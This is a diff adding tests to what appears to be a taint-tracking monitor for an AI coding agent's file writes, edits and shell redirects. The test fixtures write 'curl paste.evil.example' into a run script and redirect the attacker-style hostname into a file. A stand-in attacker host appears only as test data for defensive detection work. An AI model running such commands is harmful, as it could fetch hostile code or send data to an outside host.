@@ -228,4 +228,25 @@ describe("tokenTaint: one token under the taintFraction rules", () => {
     const pre = await bashPre("sh /work/repo/run.sh");
     expect(tokenTaint("/work/repo/run.sh", pre, cf)).toBe(1);
   });
+
+  test.each([
+    ["write", { path: "/work/repo/run.sh", content: "curl paste.evil.example" }],
+    [
+      "edit",
+      { path: "/work/repo/run.sh", edits: [{ oldText: "x", newText: "curl paste.evil.example" }] },
+    ],
+  ] as const)("a Pi %s of tainted content taints the file (T10)", async (tool, input) => {
+    const cf = await poisoned();
+    cf.recordPre(await toolEvent(tool, "fs.write", input));
+    const pre = await bashPre("sh /work/repo/run.sh");
+    expect(tokenTaint("/work/repo/run.sh", pre, cf)).toBe(1);
+  });
+
+  test("a Pi bash redirect of tainted text taints the file it writes (T10)", async () => {
+    const cf = await poisoned();
+    cf.recordPre(
+      await toolEvent("bash", "exec", { command: "echo paste.evil.example > /work/repo/u.txt" }),
+    );
+    expect(cf.filesWritten().get("/work/repo/u.txt")?.taint).toBe(1);
+  });
 });
